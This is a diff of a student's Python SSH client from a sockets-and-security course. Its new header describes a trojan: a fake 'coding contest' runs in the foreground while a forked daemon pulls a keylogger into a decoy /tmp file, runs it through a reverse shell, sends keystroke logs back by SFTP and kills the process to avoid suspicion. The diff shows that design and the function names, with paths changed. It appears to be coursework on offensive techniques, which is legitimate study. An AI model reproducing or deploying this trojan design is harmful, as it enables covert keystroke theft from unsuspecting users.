@@ -1,5 +1,54 @@
 #!/usr/bin/python3
 
+#==============================================================================
+ #      Assignment:  DPI912 Term Project
+ #      File: SSH Client
+ #
+ #      Authors: Sang Min Park, Jacky Tea
+ #      Student ID (Sang Min Park): 124218173
+ #      Student ID (Jacky Tea): 152078168
+ #      Language: Python3
+ #      Libraries Used: paramiko, socket, os, time, logzero,
+ #      threading, subprocess, sys, atexit, signal
+ #
+ #      To compile with python3 >>> python3 a1SSHClient.py 
+ #      To compile with executable >>> chmod 700 a1SSHClient.py
+ #                                 >>> ./a1SSHClient.py
+ #
+ #      Class: DPI912 NSB - Python for Programmers: Sockets and Security 
+ #      Professor: Professor Harvey Kaduri
+ #      Due Date: Friday, December 6, 2019, 5:50 PM EST
+ #      Submitted:  
+ #
+ #-----------------------------------------------------------------------------
+ #
+ #      Cookbook code utilized from the following source:
+ #      https://github.com/dabeaz/python-cookbook/blob/master/src/12/launching_a_daemon_process_on_unix/daemon.py
+ #
+ #      Description: A client containing wrapper classes for Paramiko's SSH and SFTP 
+ #      functionalities for the purpose of secure data and file tranferring. The main
+ #      thread of execution includes a surface process of non-malevolent operations 
+ #      diguised as a coding contest that requires execution of this file. A background
+ #      malevolent process is executed in tandem that sends commands from a daemon to
+ #      be executed on this client via a reverse-shell. 
+ #
+ #      Input: No command line or user input necessary.
+ #
+ #      Output: A file called in 'sshClient.log' in the current directory containing
+ #      error messages and information such as received messages over the SSH connection.
+ #
+ #      Algorithm: A non malicious 'coding contest' is started to print arbitrary messages
+ #      to the screen, then a malicious daemon is forked off which grabs keylogger file 
+ #      contents via SFTP into a file that will be executed via remotely via SSH commands.
+ #      The contents of the logs are sent back via SFTP and a SSH command kills the keylogger
+ #      remotely as to not arouse any suspicion of background processes.
+ #
+ #      Required Features Not Included:  
+ #
+ #      Known Bugs:  
+ #
+#==============================================================================
+
 import paramiko
 import socket
 import os
@@ -8,8 +57,6 @@ import logzero
 from logzero import logger
 import threading
 import subprocess
-import time
-import threading
 import sys
 import atexit
 import signal
@@ -275,9 +322,9 @@ def daemonize(pidfile, *, stdin='/dev/null',
 
 def doMaliciousActivities():
 
-    remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
+    remotepath = "./a1KeyLogger.py"
     localpath = "/tmp/ZZZZ_NOT_SUSPICIOUS_FILE"
-    remotepath2 = "/home/lab/bin/py/project/clientKeyLogs.log"
+    remotepath2 = "./clientKeyLogs.log"
     localpath2 = "/tmp/keylog.log"
 
     try:
@@ -361,11 +408,11 @@ def printNonMaliciousActivity():
 # main thread
 if __name__ == '__main__':
     try:
-        if os.path.exists("/home/lab/bin/py/project/sshClient.log"):
-            os.remove("/home/lab/bin/py/project/sshClient.log")
+        if os.path.exists("sshClient.log"):
+            os.remove("sshClient.log")
 
         # Add logging to logfile and disable output to the terminal
-        logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
+        logzero.logfile("sshClient.log", maxBytes=1e6,
                         backupCount=3, disableStderrLogger=True)
 
         printNonMaliciousActivity()
